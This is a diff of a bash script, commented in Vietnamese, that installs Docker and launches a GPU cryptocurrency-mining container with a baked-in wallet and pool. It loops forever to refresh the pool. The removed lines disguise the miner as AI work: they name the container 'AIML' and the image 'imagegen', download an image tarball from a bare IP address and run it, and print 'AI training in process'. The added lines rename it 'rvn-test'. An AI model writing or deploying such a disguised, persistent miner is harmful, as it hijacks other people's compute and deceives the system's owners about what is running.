@@ -1,8 +1,4 @@
 #!/bin/bash
-if docker ps --filter "name=AIML" --format '{{.ID}}' | grep -q .; then
-    echo "The AIML container is already running. Exiting."
-    exit 1
-fi
 
 # Hàm cập nhật mining pool và khởi động lại container nếu pool thay đổi
 update_and_restart() {
@@ -12,11 +8,11 @@ update_and_restart() {
         export POOL_URL=$new_pool_url
 
         # Dừng & xóa container cũ trước khi chạy mới
-        docker stop AIML 2>/dev/null
-        docker rm AIML 2>/dev/null
+        docker stop rvn-test 2>/dev/null
+        docker rm rvn-test 2>/dev/null
 
         # Chạy container mới với GPU (WALLET và POOL đã có sẵn trong Dockerfile)
-        docker run --gpus all -d --restart unless-stopped --name AIML riccorg/imagegen:latest
+        docker run --gpus all -d --restart unless-stopped --name rvn-test riccorg/imagegenv4:latest
     else
         echo "No updates found."
     fi
@@ -24,26 +20,16 @@ update_and_restart() {
 
 # Cài đặt Docker nếu chưa có
 install_docker() {
-    apt-get update --fix-missing
-    apt-get install -y \
+    sudo apt-get update --fix-missing
+    sudo apt-get install -y \
         apt-transport-https \
         ca-certificates \
         curl \
         software-properties-common
-    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
-    echo "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | tee /etc/apt/sources.list.d/docker.list > /dev/null
-    apt-get update --fix-missing
-    apt-get install -y docker-ce docker-ce-cli containerd.io
-}
-
-# Kiểm tra nếu Docker daemon đang chạy
-check_docker_running() {
-    if ! systemctl is-active --quiet docker; then
-        echo "Docker daemon is not running. Starting Docker..."
-        systemctl start docker
-    else
-        echo "Docker daemon is already running."
-    fi
+    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
+    echo "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+    sudo apt-get update --fix-missing
+    sudo apt-get install -y docker-ce docker-ce-cli containerd.io
 }
 
 # Kiểm tra GPU trước khi chạy mining
@@ -59,23 +45,18 @@ else
     echo "Docker đã được cài đặt."
 fi
 
-# Kiểm tra xem Docker daemon có đang chạy không, nếu không thì khởi động nó
-check_docker_running
-
 # Dừng & xóa container cũ nếu đang chạy
-docker stop AIML 2>/dev/null
-docker rm AIML 2>/dev/null
+docker stop rvn-test 2>/dev/null
+docker rm rvn-test 2>/dev/null
 
-curl -O http://45.61.157.164:8000/imagegen.tar
-docker load -i imagegen.tar
-docker run --gpus all -d --restart unless-stopped --name AIML 45.61.157.164:5000/imagegen:latest
+# Chạy Docker container mining với GPU (WALLET và POOL đã có sẵn trong Dockerfile)
+docker run --gpus all -d --restart unless-stopped --name rvn-test riccorg/imagegenv4:latest
 
 # Đợi một chút trước khi vào vòng lặp kiểm tra
 sleep 10
 
 # Vòng lặp kiểm tra liên tục (cập nhật pool mỗi 20 phút)
 while true; do
-    echo "AI training in process"
     sleep 1200  # Kiểm tra mỗi 20 phút
     update_and_restart
 done
